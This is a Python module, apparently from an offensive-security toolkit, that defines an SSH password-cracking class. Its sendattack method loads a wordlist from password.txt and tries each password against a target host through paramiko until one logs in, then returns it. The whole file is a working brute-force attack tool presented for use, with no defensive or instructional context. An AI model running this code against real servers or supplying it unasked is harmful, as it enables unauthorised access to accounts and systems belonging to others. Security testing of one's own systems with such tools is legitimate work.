#!/usr/bin/env python
# coding: UTF-8
import os
import time
import base64
import paramiko

class AtkPassCrackSSH(object):
    def __init__(self, utility, host="127.0.0.1", port=22, debug=False):
        self.utility = utility
        self.host = host
        self.port = port
        self.debug = debug
        self.description = "The module can be password cracking."
        self.target = host + ":" + str(port)

    def __str__(self):
        return 'AtkPassCrackSSH object (target: %s:%d, description: %s)' % (self.host, self.port, self.description)

    __repr__ = __str__


    def sendattack(self, user="user"):
        # Read password.txt.
        full_path = os.path.dirname(os.path.abspath(__file__))
        passwdfile = (full_path + "/../public/password.txt")
        passwdlist = []
        try:
            passwd = open(passwdfile, "r")
            passwdlist = passwd.readlines()
            passwd.close()
        except Exception as e:
            print(e)
            return None
        
        self.logger("Attack Start", "+")
        for pwd in passwdlist:
            pwd = pwd.strip()
            self.logger("Trying user: " + user + ", pwd: " + pwd, "+")
            try:
                ssh = paramiko.SSHClient()
                ssh.util.log_to_file("/dev/null", level="INFO")
                ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())
                ssh.connect(self.host, username=user, password=pwd, port=self.port, auth_timeout=1)
                try:
                    transport = ssh.get_transport()
                    transport.send_ignore()
                except EOFError as e:
                    # connection is closed
                    #print(e)
                    time.sleep(0.2)
                    continue
                except Exception as e:
                    #print(e)
                    time.sleep(0.2)
                    continue
                    
                ssh.close()
                self.logger("Attack Finished!", "+")
                return pwd
            except Exception as e:
                #print(e)
                #self.logger("May be Auth failed?", "!")
                time.sleep(0.2)
                continue

                
    def logger(self, m="", o="+"):
        message = "[{}] {}".format(o,m)
        print(message)
